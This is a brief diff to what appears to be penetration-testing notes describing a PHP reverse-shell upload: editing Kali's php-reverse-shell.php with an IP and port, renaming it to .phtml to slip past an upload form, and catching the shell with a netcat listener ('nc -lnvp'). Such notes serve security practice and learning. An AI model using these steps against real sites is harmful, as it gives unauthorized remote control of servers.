@@ -1,6 +1,7 @@
 Process
 
-take the file on kali : /usr/share/webshells/php/php-reverse-shell.php
+take the file on kali : /usr/share/webshells/php/php-reverse-shell.php or in this repo :
+
 	change the ip and the port as you want with nano . after mv the file to put the .phtml extension and upload this on a form
 	
 	start listenning on the port , the one who you change in nano, on a other terminal : with netcat : nc -lnvp [port ]
